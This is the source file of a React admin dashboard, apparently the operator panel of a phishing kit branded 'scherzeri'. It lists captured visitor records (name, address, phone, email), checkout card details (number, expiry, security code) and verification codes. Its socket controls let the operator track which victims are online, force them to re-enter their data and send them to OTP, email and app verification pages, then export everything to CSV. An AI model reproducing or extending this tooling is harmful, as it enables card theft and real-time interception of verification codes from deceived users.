
import { memo, useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { socket } from './socket';
import { useAdminRows } from './hooks/useAdminRows';
import { useAdminConnection, readAdminPasswordFromSession } from './hooks/useAdminConnection';
import { useVirtualRows } from './hooks/useVirtualRows';
import { AdminLogin } from './ui/AdminLogin';
import { CardPreviewModal } from './ui/CardPreviewModal';
import type { AdminUpdatePayload, FilterKey, OnlineUser, RecordRow, RouteTarget, SortKey } from './types';
import { fmtAgo, isSubId, safeText, toCsv, toZhStatus } from './utils/adminFormatters';

type CardPreviewData = {
  id: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutExpiryDate?: string;
  checkoutCode?: string;
};
const ADMIN_BUILD_VERSION = '2026-03-02 16:00';

function downloadBlob(filename: string, content: BlobPart, mime: string) {
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}
type ActionTone = 'danger' | 'brand' | 'neutral';

function MiniCopyBtn({ onClick, disabled, title }: { onClick: () => void; disabled: boolean; title: string }) {
  return (
    <button
      onClick={(e) => {
        e.stopPropagation();
        onClick();
      }}
      disabled={disabled}
      title={title}
      className={[
        'text-[10px] px-1.5 py-0.5 rounded-md border transition-all shrink-0',
        disabled
          ? 'bg-[#11161e] border-[#2d3642] text-[#6f7a88] cursor-not-allowed'
          : 'bg-[#1a222d] hover:bg-[#243243] border-[#304158] text-[#9fb0c5] shadow-[inset_0_1px_0_rgba(255,255,255,0.04)]',
      ].join(' ')}
    >
      复制
    </button>
  );
}

function ActionBtn({
  label,
  onClick,
  disabled,
  title,
  tone = 'neutral',
}: {
  label: string;
  onClick: () => void;
  disabled: boolean;
  title: string;
  tone?: ActionTone;
}) {
  return (
    <button
      disabled={disabled}
      onClick={onClick}
      title={title}
      className={[
        'h-7 px-2 rounded-md text-[11px] font-medium border transition-colors whitespace-nowrap',
        disabled
          ? 'bg-[#161b22] text-[#7d8590]/60 border-[#30363d] cursor-not-allowed'
          : tone === 'danger'
            ? 'bg-[#da3633] hover:bg-[#f85149] text-white border-[#f85149]/40'
            : tone === 'brand'
              ? 'bg-[#1f6feb]/20 hover:bg-[#1f6feb]/30 text-[#9ecbff] border-[#1f6feb]/45'
              : 'bg-[#21262d] hover:bg-[#30363d] text-[#d2dbe7] border-[#30363d]',
      ].join(' ')}
    >
      {label}
    </button>
  );
}

function InlineField({
  label,
  value,
  mono,
  copyTitle,
  onCopy,
  compact = false,
  extraActions,
}: {
  label: string;
  value?: string;
  mono?: boolean;
  copyTitle: string;
  onCopy: () => void;
  compact?: boolean;
  extraActions?: React.ReactNode;
}) {
  const text = safeText(value).trim();
  return (
    <div
      className={[
        'flex items-start justify-between gap-1.5 rounded-md border border-[#30363d] bg-[#161b22]',
        compact ? 'px-1.5 py-0.5' : 'px-2 py-1',
      ].join(' ')}
    >
      <div className={['min-w-0 break-words', compact ? 'leading-4' : 'leading-5'].join(' ')}>
        <span className="text-[#8b949e]">{label}：</span>
        <span className={mono ? 'font-mono text-[#c9d1d9]' : 'text-[#c9d1d9]'}>{text || '-'}</span>
      </div>
      <div className="flex items-center gap-1">
        <MiniCopyBtn title={copyTitle} disabled={!text} onClick={onCopy} />
        {extraActions}
      </div>
    </div>
  );
}

function formatStatusTime(ts: number | null) {
  if (!ts) return '未知';
  return new Date(ts).toLocaleString('zh-CN', { hour12: false });
}

type AdminRowProps = {
  row: { r: RecordRow; indent: boolean; mainId: number; subsCount: number };
  rowIndex: number;
  pageStart: number;
  virtualStartOffset: number;
  density: 'compact' | 'comfortable';
  expandAll: boolean;
  collapsedMain: Record<string, boolean>;
  showHistory: Record<string, boolean>;
  copyText: (text: string) => Promise<void>;
  openCardPreview: (r: RecordRow) => void;
  toggleCollapse: (mainId: number) => void;
  toggleHistory: (id: RecordRow['id']) => void;
  getHistoryRows: (mainId: number, excludeId: RecordRow['id']) => RecordRow[];
  handleRefill: (socketId: string) => void;
  handleCheckoutRefill: (socketId: string, recordId: RecordRow['id']) => void;
  routeUserTo: (socketId: string, target: RouteTarget) => void;
  badgeForActivity: (r: RecordRow) => { label: string; cls: string };
};

const AdminRow = memo(function AdminRow({
  row,
  rowIndex,
  pageStart,
  virtualStartOffset,
  density,
  expandAll,
  collapsedMain,
  showHistory,
  copyText,
  openCardPreview,
  toggleCollapse,
  toggleHistory,
  getHistoryRows,
  handleRefill,
  handleCheckoutRefill,
  routeUserTo,
  badgeForActivity,
}: AdminRowProps) {
  const { r, indent, mainId, subsCount } = row;
  const compactMode = density === 'compact';
  const sub = isSubId(r.id);
  const canRefill = !!r.socketId && r.online !== false;
  const canRoute = !!r.socketId && r.online !== false;
  const refillDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可重填';
  const routeDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可跳转';
  const active = !!r.active;
  const act = badgeForActivity(r);
  const showHistoryRow = !!showHistory[r.id.toString()];
  const historyRows = !sub && subsCount > 0 ? getHistoryRows(mainId, r.id) : [];
  const snapshots = (Array.isArray(r.checkoutSnapshots) ? r.checkoutSnapshots : []).slice(-3).reverse();
  const globalRowIndex = pageStart + virtualStartOffset + rowIndex;

  return (
    <tr
      className={[
        'transition-colors hover:bg-[#21262d] align-top',
        globalRowIndex % 2 === 0 ? 'bg-[#0d1117]' : 'bg-[#161b22]',
        active ? 'bg-[#1f6feb]/10 ring-1 ring-inset ring-[#1f6feb]/25' : '',
      ].join(' ')}
    >
      <td className="px-3 py-2">
        <div className="flex items-start gap-1.5">
          {!indent && subsCount > 0 && (
            <button
              onClick={() => toggleCollapse(mainId)}
              className="w-6 h-6 rounded-md bg-[#1a222d] hover:bg-[#263445] border border-[#304158] text-[10px] shrink-0"
              title="展开/折叠"
            >
              {collapsedMain[mainId.toString()] ?? !expandAll ? '＋' : '－'}
            </button>
          )}

          <div className={indent ? 'pl-4' : ''}>
            <div className={['font-mono font-bold text-[#7eb7ff] tracking-wide', compactMode ? 'text-sm leading-4' : 'text-base leading-5'].join(' ')}>{r.id}</div>
            <div className="mt-0.5 flex flex-wrap gap-1">
              <span className={r.online === false ? 'text-[10px] px-1.5 py-0.5 rounded-md bg-red-500/12 text-red-300 border border-red-500/30' : 'text-[10px] px-1.5 py-0.5 rounded-md bg-green-500/12 text-green-300 border border-green-500/28'}>
                {r.online === false ? '离线' : '在线'}
              </span>
              {active && <span className="text-[10px] px-1.5 py-0.5 rounded-md bg-[#3b82f6]/18 text-[#9bc7ff] border border-[#3b82f6]/38">当前</span>}
              {sub && <span className="text-[10px] px-1.5 py-0.5 rounded-md bg-orange-500/12 text-orange-200 border border-orange-500/30">子记录</span>}
              {(historyRows.length > 0 || snapshots.length > 0) && (
                <button
                  onClick={() => toggleHistory(r.id)}
                  className="text-[10px] px-1.5 py-0.5 rounded-md bg-[#1a222d] hover:bg-[#263445] border border-[#304158] text-[#9fb0c5]"
                >
                  {showHistoryRow ? '收起历史' : '展开历史'}
                </button>
              )}
            </div>
          </div>
        </div>
      </td>

      <td className="px-2 py-2">
        <div className="space-y-0.5 min-w-0">
          <div className="font-mono text-[11px] text-[#d2dbe7] leading-4 truncate" title={r.time || '-'}>
            {r.time || '-'}
          </div>
          <div className="font-mono text-[11px] text-[#9fb0c5] leading-4 truncate" title={r.ip || '-'}>
            {r.ip || '-'}
          </div>
        </div>
      </td>

      <td className="px-3 py-2">
        <div
          style={{
            display: 'grid',
            gridTemplateColumns: 'minmax(0, 1fr) minmax(0, 1fr)',
            columnGap: '8px',
          }}
        >
          <div className="min-w-0" style={{ display: 'grid', rowGap: '4px' }}>
            <InlineField compact label="姓名" value={r.fullname} copyTitle="复制姓名" onCopy={() => copyText(safeText(r.fullname))} />
            <InlineField compact label="地址" value={r.address} copyTitle="复制地址" onCopy={() => copyText(safeText(r.address))} />
            {!compactMode && <InlineField compact label="完整地址" value={r.fulladdress} copyTitle="复制完整地址" onCopy={() => copyText(safeText(r.fulladdress))} />}
            <InlineField compact label="城市" value={r.city} copyTitle="复制城市" onCopy={() => copyText(safeText(r.city))} />
          </div>
          <div className="min-w-0" style={{ display: 'grid', rowGap: '4px' }}>
            <InlineField compact label="州/省" value={r.state} copyTitle="复制州省" onCopy={() => copyText(safeText(r.state))} />
            <InlineField compact label="邮编" value={r.postalcode} mono copyTitle="复制邮编" onCopy={() => copyText(safeText(r.postalcode))} />
            <InlineField compact label="电话" value={r.telephone} mono copyTitle="复制电话" onCopy={() => copyText(safeText(r.telephone))} />
            {!compactMode && <InlineField compact label="邮箱" value={r.email} mono copyTitle="复制邮箱" onCopy={() => copyText(safeText(r.email))} />}
          </div>
        </div>

        {showHistoryRow && historyRows.length > 0 && (
          <div className="mt-1.5 rounded-md border border-[#2b3542] bg-[#0f151e]/70 p-1.5 space-y-1">
            <div className="text-[10px] text-[#8ea2bc]">资料历史（最近3条）</div>
            {historyRows.map((h) => (
              <div key={`his-${r.id}-${h.id}`} className="text-[11px] text-[#9fb0c5] leading-5 break-words rounded-sm bg-[#0c121b] border border-[#243244] px-1.5 py-1">
                <span className="font-mono text-[#8abfff]">{h.id}</span> · {safeText(h.fullname) || '-'} · {safeText(h.address) || '-'}
              </div>
            ))}
          </div>
        )}
      </td>

      <td className="px-3 py-2 space-y-1">
        <InlineField label="姓名" value={r.checkoutName} copyTitle="复制结账姓名" onCopy={() => copyText(safeText(r.checkoutName))} />
        <InlineField
          label="号码"
          value={r.checkoutPhone}
          mono
          copyTitle="复制结账号码"
          onCopy={() => copyText(safeText(r.checkoutPhone))}
          extraActions={
            <button
              onClick={() => openCardPreview(r)}
              className="h-5 px-1.5 rounded-md text-[10px] font-medium border transition-colors bg-[#1f6feb]/20 hover:bg-[#1f6feb]/30 text-[#9ecbff] border-[#1f6feb]/45"
              title="显示号码卡片样式"
            >
              显示卡片
            </button>
          }
        />
        <InlineField
          label="日期"
          value={r.checkoutDate || r.checkoutExpiryDate}
          mono
          copyTitle="复制结账日期"
          onCopy={() => copyText(safeText(r.checkoutDate || r.checkoutExpiryDate))}
        />
        {!compactMode && <InlineField label="验证码" value={r.checkoutCode} mono copyTitle="复制结账验证码" onCopy={() => copyText(safeText(r.checkoutCode))} />}

        {showHistoryRow && snapshots.length > 0 && (
          <div className="mt-1.5 rounded-md border border-[#2b3542] bg-[#0f151e]/70 p-1.5 space-y-1">
            <div className="text-[10px] text-[#8ea2bc]">结账历史（最近3条）</div>
            {snapshots.map((s, idx) => (
              <div key={`snap-${r.id}-${idx}`} className="text-[11px] text-[#9fb0c5] leading-5 break-words rounded-sm bg-[#0c121b] border border-[#243244] px-1.5 py-1">
                <span className="font-mono text-[#8abfff]">{s.time || `第${idx + 1}条`}</span> · {safeText(s.checkoutName) || '-'} · {safeText(s.checkoutPhone) || '-'} · {safeText(s.checkoutCode) || '-'}
              </div>
            ))}
          </div>
        )}
      </td>

      <td className="px-3 py-2 space-y-1">
        <InlineField label="验证" value={r.verify} mono copyTitle="复制验证" onCopy={() => copyText(safeText(r.verify))} />
        {!compactMode && <InlineField label="邮箱验证" value={r.emailVerify} mono copyTitle="复制邮箱验证" onCopy={() => copyText(safeText(r.emailVerify))} />}
        {!compactMode && <InlineField label="应用验证" value={r.appCheck} mono copyTitle="复制应用验证" onCopy={() => copyText(safeText(r.appCheck))} />}
      </td>

      <td className="px-3 py-2 text-center">
        <span className="inline-flex items-center justify-center bg-[#1a222d] text-[#d4ddeb] px-2.5 py-1 rounded-xl text-[11px] font-medium border border-[#304158] whitespace-nowrap max-w-[200px] shadow-[inset_0_1px_0_rgba(255,255,255,0.05)]">
          <span className="truncate">{toZhStatus(r.status, r.page)}</span>
        </span>
      </td>

      <td className="px-3 py-2 text-center">
        <span className={['inline-flex items-center justify-center px-2 py-1 rounded-xl text-[11px] font-medium border whitespace-nowrap', act.cls].join(' ')}>
          {act.label}
        </span>
      </td>

      <td className="px-3 py-2">
        <div className="mx-auto w-[280px] rounded-xl border border-[#30363d] bg-[#161b22] p-2">
          <div className="text-[10px] text-[#9fb0c5] mb-1 tracking-wide">重填</div>
          <div className="grid grid-cols-2 gap-1.5">
            <ActionBtn
              label="重填资料"
              tone="danger"
              disabled={!canRefill}
              onClick={() => canRefill && handleRefill(r.socketId)}
              title={!canRefill ? refillDisabledReason : '强制重填 Info 表单'}
            />
            <ActionBtn
              label="重填结账"
              tone="brand"
              disabled={!canRefill}
              onClick={() => canRefill && handleCheckoutRefill(r.socketId, r.id)}
              title={!canRefill ? refillDisabledReason : '在当前序号下重填结账'}
            />
          </div>
          {!canRefill && <div className="mt-1 text-[10px] text-[#9aa7b8]">{refillDisabledReason}</div>}

          <div className="mt-2 pt-2 border-t border-[#304158]">
            <div className="text-[10px] text-[#9fb0c5] mb-1 tracking-wide">跳转</div>
            <div className="grid grid-cols-3 gap-1.5">
              <ActionBtn label="去验证" disabled={!canRoute} onClick={() => canRoute && routeUserTo(r.socketId, 'verify')} title={!canRoute ? routeDisabledReason : '跳到验证页'} />
              <ActionBtn label="去邮箱验证" disabled={!canRoute} onClick={() => canRoute && routeUserTo(r.socketId, 'emailverify')} title={!canRoute ? routeDisabledReason : '跳到邮箱验证页'} />
              <ActionBtn label="去应用验证" disabled={!canRoute} onClick={() => canRoute && routeUserTo(r.socketId, 'appcheck')} title={!canRoute ? routeDisabledReason : '跳到应用验证页'} />
            </div>
            {!canRoute && <div className="mt-1 text-[10px] text-[#9aa7b8]">{routeDisabledReason}</div>}
          </div>
        </div>
      </td>
    </tr>
  );
});

export default function AdminDashboard() {
  const tableContainerRef = useRef<HTMLDivElement | null>(null);
  const [records, setRecords] = useState<RecordRow[]>([]);
  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
  const [adminPassword, setAdminPassword] = useState(() => readAdminPasswordFromSession());

  const [q, setQ] = useState('');
  const [filter, setFilter] = useState<FilterKey>('all');
  const [onlyMain, setOnlyMain] = useState(false);
  const [onlyOnline, setOnlyOnline] = useState(false);
  const [onlyCurrent, setOnlyCurrent] = useState(false);
  const [sortBy, setSortBy] = useState<SortKey>('id_desc');
  const [pageSize, setPageSize] = useState(50);
  const [density, setDensity] = useState<'compact' | 'comfortable'>('comfortable');
  const [page, setPage] = useState(1);
  const [expandAll, setExpandAll] = useState(true);
  const [collapsedMain, setCollapsedMain] = useState<Record<string, boolean>>({});
  const [showHistory, setShowHistory] = useState<Record<string, boolean>>({});

  const [pendingRecords, setPendingRecords] = useState<RecordRow[] | null>(null);
  const [pendingOnlineUsers, setPendingOnlineUsers] = useState<OnlineUser[] | null>(null);
  const [pendingCount, setPendingCount] = useState(0);
  const [viewLocked, setViewLocked] = useState(false);
  const [cardPreview, setCardPreview] = useState<CardPreviewData | null>(null);

  const searchRef = useRef<HTMLInputElement | null>(null);
  const recordsLenRef = useRef(0);
  const viewLockedRef = useRef(false);

  useEffect(() => {
    recordsLenRef.current = records.length;
  }, [records.length]);

  useEffect(() => {
    viewLockedRef.current = viewLocked;
  }, [viewLocked]);

  useEffect(() => {
    const updateLockState = () => {
      const tableScrollTop = tableContainerRef.current?.scrollTop || 0;
      const locked = window.scrollY > 8 || tableScrollTop > 8;
      setViewLocked((prev) => (prev === locked ? prev : locked));
    };
    const onWindowScroll = () => updateLockState();
    const tableEl = tableContainerRef.current;
    updateLockState();
    window.addEventListener('scroll', onWindowScroll, { passive: true });
    tableEl?.addEventListener('scroll', updateLockState, { passive: true });
    return () => {
      window.removeEventListener('scroll', onWindowScroll);
      tableEl?.removeEventListener('scroll', updateLockState);
    };
  }, []);

  const applyWithScrollLock = useCallback(
    (nextRecords: RecordRow[] | null, nextOnline: OnlineUser[] | null) => {
      const y = window.scrollY;
      if (nextRecords) setRecords(nextRecords);
      if (nextOnline) setOnlineUsers(nextOnline);
      setPendingRecords(null);
      setPendingOnlineUsers(null);
      setPendingCount(0);
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          window.scrollTo({ top: y });
        });
      });
    },
    []
  );

  const handleAdminUpdate = useCallback(
    (data: AdminUpdatePayload) => {
      const nextRecords: RecordRow[] | null = Array.isArray(data.records) ? (data.records as RecordRow[]) : null;
      const nextOnline: OnlineUser[] | null = Array.isArray(data.onlineUsers) ? (data.onlineUsers as OnlineUser[]) : null;

      if (viewLockedRef.current) {
        if (nextRecords) {
          setPendingRecords(nextRecords);
          setPendingCount((prev) => {
            const add = Math.max(0, nextRecords.length - recordsLenRef.current);
            return Math.max(prev, add);
          });
        }
        if (nextOnline) setPendingOnlineUsers(nextOnline);
        return;
      }

      applyWithScrollLock(nextRecords, nextOnline);
    },
    [applyWithScrollLock]
  );

  const {
    adminAuthed,
    authLoading,
    authError,
    connectionState,
    lastDisconnectReason,
    lastDisconnectAt,
    lastConnectError,
    reconnectCount,
    requestAdminAuth,
  } = useAdminConnection({
    adminPassword,
    onAdminUpdate: handleAdminUpdate,
    onAuthFailed: () => {
      setRecords([]);
      setOnlineUsers([]);
      setPendingRecords(null);
      setPendingOnlineUsers(null);
      setPendingCount(0);
    },
  });

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === '/' && !(e.target instanceof HTMLInputElement) && !(e.target instanceof HTMLTextAreaElement)) {
        e.preventDefault();
        searchRef.current?.focus();
      }
      if (e.key === 'Escape' && document.activeElement === searchRef.current) {
        setQ('');
        searchRef.current?.blur();
      }
    };

    window.addEventListener('keydown', onKey);

    return () => {
      window.removeEventListener('keydown', onKey);
    };
  }, []);

  useEffect(() => {
    if (!viewLocked && (pendingRecords || pendingOnlineUsers)) {
      applyWithScrollLock(pendingRecords, pendingOnlineUsers);
    }
  }, [viewLocked, pendingRecords, pendingOnlineUsers, applyWithScrollLock]);

  const copyText = useCallback(async (text: string) => {
    try {
      await navigator.clipboard?.writeText(text);
    } catch {
      // ignore
    }
  }, []);

  const openCardPreview = useCallback((r: RecordRow) => {
    setCardPreview({
      id: r.id.toString(),
      checkoutName: r.checkoutName,
      checkoutPhone: r.checkoutPhone,
      checkoutExpiryDate: r.checkoutDate || r.checkoutExpiryDate,
      checkoutCode: r.checkoutCode,
    });
  }, []);

  const { grouped, filterCounts, totalRows, totalPages, safePage, pageStart, pagedRows } = useAdminRows({
    records,
    sortBy,
    q,
    filter,
    onlyMain,
    onlyOnline,
    onlyCurrent,
    collapsedMain,
    expandAll,
    page,
    pageSize,
  });

  const groupRecordMap = useMemo(() => {
    const m = new Map<number, RecordRow[]>();
    for (const g of grouped) {
      const list = [g.main, ...g.subs].filter(Boolean) as RecordRow[];
      m.set(g.mainId, list);
    }
    return m;
  }, [grouped]);

  const getHistoryRows = useCallback(
    (mainId: number, excludeId: RecordRow['id']) => {
      const rows = groupRecordMap.get(mainId) || [];
      return rows.filter((x) => x.id.toString() !== excludeId.toString()).slice(0, 3);
    },
    [groupRecordMap]
  );

  useEffect(() => {
    setPage(1);
  }, [q, filter, onlyMain, onlyOnline, onlyCurrent, sortBy, pageSize]);

  useEffect(() => {
    if (page !== safePage) setPage(safePage);
  }, [page, safePage]);

  const toggleCollapse = useCallback((mainId: number) => {
    setCollapsedMain((prev) => ({ ...prev, [mainId.toString()]: !(prev[mainId.toString()] ?? !expandAll) }));
  }, [expandAll]);

  const toggleHistory = useCallback((id: RecordRow['id']) => {
    const k = id.toString();
    setShowHistory((prev) => ({ ...prev, [k]: !prev[k] }));
  }, []);

  const onlineCount = onlineUsers.filter((u) => u.online).length;
  const hasExpandedHistory = useMemo(() => Object.values(showHistory).some(Boolean), [showHistory]);
  const virtualEnabled = pagedRows.length > 40 && !hasExpandedHistory;
  const { start: virtualStart, end: virtualEnd, top: virtualTop, bottom: virtualBottom } = useVirtualRows(tableContainerRef, {
    rowCount: pagedRows.length,
    rowHeight: density === 'compact' ? 180 : 250,
    overscan: 6,
    enabled: virtualEnabled,
  });
  const visibleRows = useMemo(() => {
    if (!virtualEnabled) return pagedRows;
    if (virtualEnd < virtualStart) return [];
    return pagedRows.slice(virtualStart, virtualEnd + 1);
  }, [pagedRows, virtualEnabled, virtualEnd, virtualStart]);

  const handleClear = useCallback(() => {
    if (window.confirm('确定清空所有记录？此操作不可恢复。')) {
      socket.emit('admin-clear-all', {}, (resp) => {
        if (!resp?.ok) alert(`清空失败：${resp?.error || 'unknown error'}`);
      });
    }
  }, []);

  const handleDownloadCsv = useCallback(() => {
    const ts = new Date().toISOString().replace(/[:.]/g, '-');
    downloadBlob(`records-${ts}.csv`, toCsv(records), 'text/csv;charset=utf-8');
  }, [records]);

  const handleRefill = useCallback((socketId: string) => {
    if (!socketId) return;
    if (window.confirm('确定重填资料？会创建子序号。')) socket.emit('request-refill', { socketId, reason: '' });
  }, []);

  const handleCheckoutRefill = useCallback((socketId: string, recordId: RecordRow['id']) => {
    if (!socketId) return;
    if (window.confirm('确定重填结账？会在当前序号下重填，不会新增序号。')) {
      socket.emit('request-checkout-refill', { socketId, recordId });
    }
  }, []);

  const routeUserTo = useCallback((socketId: string, target: RouteTarget) => {
    if (!socketId) {
      alert('缺少 socketId，无法跳转。');
      return;
    }
    socket.emit('admin-route-user', { socketId, target }, (resp: any) => {
      if (!resp?.ok) alert(`跳转失败：${resp?.error || 'unknown error'}`);
    });
  }, []);

  const badgeForActivity = useCallback((r: RecordRow) => {
    if (r.online === false) return { label: '离线', cls: 'bg-red-500/10 text-red-300 border-red-500/20' };
    const ms = Date.now() - (r.updatedAt || Date.now());
    if (ms < 20_000) return { label: `活跃 · ${fmtAgo(ms)}`, cls: 'bg-green-500/10 text-green-300 border-green-500/20' };
    if (ms < 120_000) return { label: `空闲 · ${fmtAgo(ms)}`, cls: 'bg-yellow-500/10 text-yellow-200 border-yellow-500/20' };
    return { label: `卡住 · ${fmtAgo(ms)}`, cls: 'bg-orange-500/10 text-orange-200 border-orange-500/20' };
  }, []);

  const FilterButton = ({ k, label, count }: { k: FilterKey; label: string; count: number }) => (
    <button
      onClick={() => setFilter(k)}
      className={[
        'px-2.5 py-1.5 rounded-lg text-xs border transition-colors',
        filter === k
          ? 'bg-[#1f6feb]/20 text-[#9ecbff] border-[#1f6feb]/40'
          : 'bg-[#21262d] text-[#8b949e] border-[#30363d] hover:bg-[#30363d]',
      ].join(' ')}
    >
      {label}
      <span className="ml-1.5 font-mono text-[11px] opacity-80">{count}</span>
    </button>
  );

  const connectionTone =
    connectionState === 'connected'
      ? 'border-emerald-500/30 bg-emerald-500/10 text-emerald-200'
      : connectionState === 'reconnecting'
        ? 'border-amber-500/30 bg-amber-500/10 text-amber-100'
        : 'border-red-500/30 bg-red-500/10 text-red-200';
  const connectionLabel =
    connectionState === 'connected'
      ? '已连接'
      : connectionState === 'reconnecting'
        ? '重连中'
        : '连接中断';
  const pendingUpdates = pendingCount > 0 ? pendingCount : pendingRecords?.length || 0;
  const emptyStateText =
    records.length === 0
      ? '后端尚未推送任何记录'
      : q || filter !== 'all' || onlyMain || onlyOnline || onlyCurrent
        ? '当前筛选条件下没有匹配记录'
        : '暂无匹配记录';

  if (!adminAuthed) {
    return (
      <AdminLogin
        brandName="scherzeri"
        adminPassword={adminPassword}
        authLoading={authLoading}
        authError={authError}
        connectionState={connectionState}
        lastDisconnectAt={lastDisconnectAt}
        lastDisconnectReason={lastDisconnectReason}
        lastConnectError={lastConnectError}
        reconnectCount={reconnectCount}
        onPasswordChange={setAdminPassword}
        onSubmit={() => requestAdminAuth(adminPassword)}
      />
    );
  }

  return (
    <div className="min-h-screen bg-[radial-gradient(circle_at_top,#1a2332_0%,#0d1117_45%,#0d1117_100%)] text-[#c9d1d9] p-3 sm:p-4 md:p-6 font-sans">
      <div className="mx-auto flex w-full max-w-[1820px] flex-col gap-4">
      <div className="rounded-[28px] border border-[#30363d] bg-[linear-gradient(135deg,rgba(22,27,34,0.96),rgba(13,17,23,0.94))] p-5 shadow-[0_18px_48px_rgba(0,0,0,0.24)]">
        <div className="flex flex-col gap-3 md:flex-row md:justify-between md:items-end">
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-2xl md:text-3xl font-semibold text-[#e6edf3] tracking-tight">管理后台</h1>
              <span className="rounded-md border border-[#30363d] bg-[#0d1117] px-2 py-0.5 text-[10px] font-mono text-[#9fb0c5]">
                v{ADMIN_BUILD_VERSION}
              </span>
            </div>
            <p className="text-[#9da7b3] mt-1 text-xs">
              快捷键：按
              <span className="mx-1 font-mono bg-[#0d1117] border border-[#30363d] px-1.5 py-0.5 rounded-md text-[#e6edf3]">/</span>
              搜索
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={handleClear}
              className="bg-[#da3633] hover:bg-[#f85149] border border-[#f85149]/40 px-3 py-2 rounded-xl text-xs font-medium transition-colors"
              title="清空全部记录"
            >
              清空全部
            </button>

            <div className="flex items-center gap-2 bg-[#0d1117] border border-[#30363d] px-3 py-2 rounded-xl text-xs">
              <div className="w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse" />
              在线 <span className="font-mono text-green-300 font-bold">{onlineCount}</span>
            </div>

            <button
              onClick={handleDownloadCsv}
              className="bg-[#21262d] hover:bg-[#30363d] border border-[#30363d] px-3 py-2 rounded-xl text-xs font-medium transition-colors"
            >
              下载CSV
            </button>
          </div>
        </div>
      </div>

      <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-4">
        <div className="rounded-2xl border border-[#304158] bg-[#111923]/92 px-4 py-3 shadow-[0_10px_22px_rgba(0,0,0,0.16)]">
          <div className="text-[11px] uppercase tracking-[0.22em] text-[#7d8ea3]">在线用户</div>
          <div className="mt-2 flex items-end justify-between">
            <div className="font-mono text-3xl font-semibold text-[#9ee37d]">{onlineCount}</div>
            <div className="rounded-full border border-emerald-500/30 bg-emerald-500/10 px-2 py-0.5 text-[11px] text-emerald-200">实时</div>
          </div>
        </div>
        <div className="rounded-2xl border border-[#304158] bg-[#111923]/92 px-4 py-3 shadow-[0_10px_22px_rgba(0,0,0,0.16)]">
          <div className="text-[11px] uppercase tracking-[0.22em] text-[#7d8ea3]">总记录</div>
          <div className="mt-2 flex items-end justify-between">
            <div className="font-mono text-3xl font-semibold text-[#e6edf3]">{records.length}</div>
            <div className="text-[11px] text-[#8b949e]">当前内存集</div>
          </div>
        </div>
        <div className="rounded-2xl border border-[#304158] bg-[#111923]/92 px-4 py-3 shadow-[0_10px_22px_rgba(0,0,0,0.16)]">
          <div className="text-[11px] uppercase tracking-[0.22em] text-[#7d8ea3]">当前视图</div>
          <div className="mt-2 flex items-end justify-between">
            <div className="font-mono text-3xl font-semibold text-[#8abfff]">{totalRows}</div>
            <div className="text-[11px] text-[#8b949e]">筛选后结果</div>
          </div>
        </div>
        <div className="rounded-2xl border border-[#304158] bg-[#111923]/92 px-4 py-3 shadow-[0_10px_22px_rgba(0,0,0,0.16)]">
          <div className="text-[11px] uppercase tracking-[0.22em] text-[#7d8ea3]">待同步更新</div>
          <div className="mt-2 flex items-end justify-between">
            <div className="font-mono text-3xl font-semibold text-[#ffd479]">{pendingUpdates}</div>
            <div className="text-[11px] text-[#8b949e]">{viewLocked ? '滚动锁定中' : '自动同步'}</div>
          </div>
        </div>
      </div>

      <div className="sticky top-3 z-20 flex flex-col gap-4">
      <div className={['rounded-2xl border px-3 py-2 shadow-[0_10px_20px_rgba(0,0,0,0.14)] backdrop-blur-md', connectionTone].join(' ')}>
        <div className="flex flex-col gap-1 md:flex-row md:items-center md:justify-between">
          <div className="text-sm font-medium">{connectionLabel}</div>
          <div className="text-[11px] opacity-90">
            重连次数 <span className="font-mono">{reconnectCount}</span>
            {lastDisconnectAt ? (
              <>
                {' '}· 上次中断 <span className="font-mono">{formatStatusTime(lastDisconnectAt)}</span>
              </>
            ) : null}
            {lastDisconnectReason ? <> · 原因：{lastDisconnectReason}</> : null}
          </div>
        </div>
        {connectionState !== 'connected' && (
          <div className="mt-1 text-xs opacity-90">
            {lastConnectError ? `连接错误：${lastConnectError}` : '后端连接不稳定时将暂停实时更新，恢复后会继续同步。'}
          </div>
        )}
      </div>

      <div className="bg-[rgba(22,27,34,0.86)] border border-[#30363d] rounded-[26px] p-4 shadow-[0_14px_32px_rgba(0,0,0,0.2)] backdrop-blur-md">
        <div className="flex flex-col gap-3">
          <div className="grid gap-3 xl:grid-cols-[minmax(0,1.4fr)_minmax(420px,1fr)]">
            <div className="relative">
              <input
                ref={searchRef}
                value={q}
                onChange={(e) => setQ(e.target.value)}
                placeholder="搜索：序号 / 姓名 / IP / 地址 / 邮箱 / 电话 / 状态"
                className="w-full bg-[#0d1117] border border-[#30363d] rounded-xl px-3 py-2 text-xs outline-none focus:border-[#1f6feb] focus:ring-2 focus:ring-[#1f6feb]/20"
              />
              {q && (
                <button
                  onClick={() => setQ('')}
                  className="absolute right-2 top-1/2 -translate-y-1/2 text-[#8b949e] hover:text-[#c9d1d9]"
                  title="清空搜索"
                >
                  ✕
                </button>
                )}
              </div>

            <div className="grid gap-2 sm:grid-cols-2 xl:grid-cols-3">
              <label className="flex items-center gap-1.5 rounded-xl border border-[#2a3440] bg-[#0d1117]/80 px-3 py-2 text-xs text-[#8b949e]">
                <input type="checkbox" checked={onlyMain} onChange={(e) => setOnlyMain(e.target.checked)} className="accent-[#58a6ff]" />
                仅主记录
              </label>
              <label className="flex items-center gap-1.5 rounded-xl border border-[#2a3440] bg-[#0d1117]/80 px-3 py-2 text-xs text-[#8b949e]">
                <input type="checkbox" checked={onlyOnline} onChange={(e) => setOnlyOnline(e.target.checked)} className="accent-[#58a6ff]" />
                仅在线
              </label>
              <label className="flex items-center gap-1.5 rounded-xl border border-[#2a3440] bg-[#0d1117]/80 px-3 py-2 text-xs text-[#8b949e]">
                <input
                  type="checkbox"
                  checked={onlyCurrent}
